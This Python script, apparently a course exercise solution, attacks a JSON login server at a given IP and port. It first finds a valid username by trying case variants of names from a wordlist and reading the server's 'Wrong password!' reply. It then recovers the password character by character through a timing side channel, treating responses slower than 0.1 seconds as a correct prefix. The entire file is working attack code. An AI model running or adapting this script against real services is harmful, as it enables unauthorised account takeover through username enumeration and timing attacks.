import argparse
import itertools
import json
import socket
import string
import time


def generate_cases(word):
    # Generate all combinations of lower and uppercase letters for a word,
    # ignoring non-alphabetic characters
    for letters in itertools.product(
            *([letter.lower(), letter.upper()] if letter.isalpha() else [letter] for letter in word)):
        yield ''.join(letters)


def find_login():
    with open("logins.txt", 'r') as f:
        logins = [line.strip() for line in f.readlines()]
    for login in logins:
        for loginCase in generate_cases(login):
            response = send_request(loginCase, "")[0]
            if response == "Wrong password!":
                return loginCase


def send_request(login, pswd):
    req = {"login": login, "password": pswd}
    s = time.perf_counter()
    sock.sendall(json.dumps(req).encode('utf-8'))
    # Receive the server's response
    response = sock.recv(1024)
    e = time.perf_counter()
    t = e-s
    # print("pass time: " + str(t))
    return json.loads(response.decode())['result'], t


def find_password(login, pas):
    alphabet = string.ascii_letters + string.digits
    for alpha in alphabet:
        resp, t = send_request(login, pas + alpha)
        # print(f"t: {t} , res: {resp}")
        if resp == "Wrong password!":
            # print("AAAAA: " + pas)
            if t > 0.1:
                pas += alpha
                # print(f"good pas: {pas}")
                return find_password(login, pas)
        if resp == "Connection success!":
            # print("YAY!")
            return pas + alpha


# Create the parser
parser = argparse.ArgumentParser(description="A script that receives an IP address, port, and message for sending")

# Add the arguments
parser.add_argument('IP', metavar='IP', type=str, help='The IP address')
parser.add_argument('Port', metavar='Port', type=int, help='The port number')

# Parse the arguments
args = parser.parse_args()

# Create a new socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    sock.connect((args.IP, args.Port))
    login = find_login()
    password = find_password(login, "")
    print(json.dumps({"login": login, "password": password}))
finally:
    # Close the socket
    sock.close()
